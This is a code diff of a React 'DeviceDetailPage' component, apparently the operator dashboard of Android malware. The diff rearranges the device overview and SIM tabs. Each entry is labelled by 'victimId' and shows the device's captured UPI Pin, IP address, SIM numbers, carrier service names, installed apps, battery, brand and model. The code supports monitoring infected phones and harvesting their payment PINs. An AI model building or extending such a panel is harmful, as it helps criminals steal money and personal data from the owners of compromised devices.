@@ -188,49 +188,73 @@ export function DeviceDetailPage() {
             <TabsContent value="overview">
               <Card className="card-glass border-0">
                 <CardContent className="p-8">
-                  <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
-                    <div className="space-y-4">
-                      <div className="flex justify-between items-center">
-                        <span className="text-muted-foreground font-medium">Device:</span>
-                        <span className="font-mono">{victimId}</span>
+                  <div className="space-y-6">
+                    {/* Device Information */}
+                    <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                      <div className="space-y-4">
+                        <div className="flex justify-between items-center">
+                          <span className="text-muted-foreground font-medium">Device:</span>
+                          <span className="font-mono">{victimId}</span>
+                        </div>
+                        <div className="flex justify-between items-center">
+                          <span className="text-muted-foreground font-medium">Status:</span>
+                          <Badge className={device.Status === 'Online' ? 'badge-online' : 'badge-offline'}>
+                            {device.Status || 'Unknown'}
+                          </Badge>
+                        </div>
+                        <div className="flex justify-between items-center">
+                          <span className="text-muted-foreground font-medium">IP Address:</span>
+                          <span className="font-mono">{device.IPAddress || 'Unknown'}</span>
+                        </div>
+                        <div className="flex justify-between items-center">
+                          <span className="text-muted-foreground font-medium">UPI Pin:</span>
+                          <code className="bg-muted px-2 py-1 rounded text-sm">{device.UPIPin || 'Unknown'}</code>
+                        </div>
                       </div>
-                      <div className="flex justify-between items-center">
-                        <span className="text-muted-foreground font-medium">Status:</span>
-                        <Badge className={device.Status === 'Online' ? 'badge-online' : 'badge-offline'}>
-                          {device.Status || 'Unknown'}
-                        </Badge>
-                      </div>
-                      <div className="flex justify-between items-center">
-                        <span className="text-muted-foreground font-medium">Android:</span>
-                        <span>{device.AndroidVersion || 'Unknown'}</span>
-                      </div>
-                      <div className="flex justify-between items-center">
-                        <span className="text-muted-foreground font-medium">IP Address:</span>
-                        <span className="font-mono">{device.IPAddress || 'Unknown'}</span>
-                      </div>
-                      <div className="flex justify-between items-center">
-                        <span className="text-muted-foreground font-medium">UPI Pin:</span>
-                        <code className="bg-muted px-2 py-1 rounded text-sm">{device.UPIPin || 'Unknown'}</code>
+                      <div className="space-y-4">
+                        <div className="flex justify-between items-center">
+                          <span className="text-muted-foreground font-medium">Note:</span>
+                          <span>{device.Note || '-'}</span>
+                        </div>
+                        <div className="flex justify-between items-center">
+                          <span className="text-muted-foreground font-medium">Added:</span>
+                          <span>{device.Added || '-'}</span>
+                        </div>
+                        <div className="flex justify-between items-center">
+                          <span className="text-muted-foreground font-medium">Apps Installed:</span>
+                          <Badge variant="outline">{device.AppsInstalled || 0}</Badge>
+                        </div>
+                        <div className="flex justify-between items-center">
+                          <span className="text-muted-foreground font-medium">Battery:</span>
+                          <Badge variant={parseInt(device.Battery?.replace('%', '') || '0') < 20 ? 'destructive' : 'default'}>
+                            {device.Battery || 'Unknown'}
+                          </Badge>
+                        </div>
                       </div>
                     </div>
-                    <div className="space-y-4">
-                      <div className="flex justify-between items-center">
-                        <span className="text-muted-foreground font-medium">Note:</span>
-                        <span>{device.Note || '-'}</span>
-                      </div>
-                      <div className="flex justify-between items-center">
-                        <span className="text-muted-foreground font-medium">Added:</span>
-                        <span>{device.Added || '-'}</span>
-                      </div>
-                      <div className="flex justify-between items-center">
-                        <span className="text-muted-foreground font-medium">Apps Installed:</span>
-                        <Badge variant="outline">{device.AppsInstalled || 0}</Badge>
-                      </div>
-                      <div className="flex justify-between items-center">
-                        <span className="text-muted-foreground font-medium">Battery:</span>
-                        <Badge variant={parseInt(device.Battery?.replace('%', '') || '0') < 20 ? 'destructive' : 'default'}>
-                          {device.Battery || 'Unknown'}
-                        </Badge>
+
+                    {/* Device Brand, Model, and Android Version */}
+                    <div className="border-t pt-6">
+                      <h3 className="text-lg font-semibold mb-4">Device Specifications</h3>
+                      <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+                        <div className="p-4 bg-muted/30 rounded-lg">
+                          <div className="flex justify-between items-center">
+                            <span className="text-muted-foreground font-medium">Brand:</span>
+                            <Badge variant="outline">{device.Brand || 'Unknown'}</Badge>
+                          </div>
+                        </div>
+                        <div className="p-4 bg-muted/30 rounded-lg">
+                          <div className="flex justify-between items-center">
+                            <span className="text-muted-foreground font-medium">Model:</span>
+                            <span className="font-mono">{device.Model || 'Unknown'}</span>
+                          </div>
+                        </div>
+                        <div className="p-4 bg-muted/30 rounded-lg">
+                          <div className="flex justify-between items-center">
+                            <span className="text-muted-foreground font-medium">Android Version:</span>
+                            <Badge variant="outline">{device.AndroidVersion || 'Unknown'}</Badge>
+                          </div>
+                        </div>
                       </div>
                     </div>
                   </div>
@@ -278,21 +302,65 @@ export function DeviceDetailPage() {
                   </CardTitle>
                 </CardHeader>
                 <CardContent>
-                  {sims.length === 0 ? (
-                    <p className="text-muted-foreground text-center py-12">No SIM cards found</p>
-                  ) : (
+                  <div className="space-y-6">
+                    {/* Device SIM Numbers */}
                     <div className="space-y-3">
-                      {sims.map((sim, idx) => (
-                        <div key={idx} className="flex items-center justify-between p-4 bg-muted/30 rounded-lg">
-                          <div>
-                            <span className="font-medium">Slot {sim.slot}</span>
-                            <p className="text-sm text-muted-foreground">{sim.carrier || 'No carrier'}</p>
+                      <h3 className="text-lg font-semibold">Device SIM Numbers</h3>
+                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
+                        <div className="p-4 bg-muted/30 rounded-lg">
+                          <div className="flex justify-between items-center">
+                            <span className="text-muted-foreground font-medium">SIM 1:</span>
+                            <span className="font-mono">{device.SimNumber1 || 'Unknown'}</span>
                           </div>
-                          <code className="text-sm font-mono">{sim.number || 'No number'}</code>
                         </div>
-                      ))}
+                        <div className="p-4 bg-muted/30 rounded-lg">
+                          <div className="flex justify-between items-center">
+                            <span className="text-muted-foreground font-medium">SIM 2:</span>
+                            <span className="font-mono">{device.SimNumber2 || 'Unknown'}</span>
+                          </div>
+                        </div>
+                      </div>
                     </div>
-                  )}
+
+                    {/* Device Service Names */}
+                    <div className="space-y-3">
+                      <h3 className="text-lg font-semibold">Device Service Names</h3>
+                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
+                        <div className="p-4 bg-muted/30 rounded-lg">
+                          <div className="flex justify-between items-center">
+                            <span className="text-muted-foreground font-medium">Service 1:</span>
+                            <span>{device.ServiceName1 || 'Unknown'}</span>
+                          </div>
+                        </div>
+                        <div className="p-4 bg-muted/30 rounded-lg">
+                          <div className="flex justify-between items-center">
+                            <span className="text-muted-foreground font-medium">Service 2:</span>
+                            <span>{device.ServiceName2 || 'Unknown'}</span>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+
+                    {/* SIM Cards from Database */}
+                    <div className="space-y-3">
+                      <h3 className="text-lg font-semibold">SIM Cards from Database</h3>
+                      {sims.length === 0 ? (
+                        <p className="text-muted-foreground text-center py-8">No SIM cards found in database</p>
+                      ) : (
+                        <div className="space-y-3">
+                          {sims.map((sim, idx) => (
+                            <div key={idx} className="flex items-center justify-between p-4 bg-muted/30 rounded-lg">
+                              <div>
+                                <span className="font-medium">Slot {sim.slot}</span>
+                                <p className="text-sm text-muted-foreground">{sim.carrier || 'No carrier'}</p>
+                              </div>
+                              <code className="text-sm font-mono">{sim.number || 'No number'}</code>
+                            </div>
+                          ))}
+                        </div>
+                      )}
+                    </div>
+                  </div>
                 </CardContent>
               </Card>
             </TabsContent>
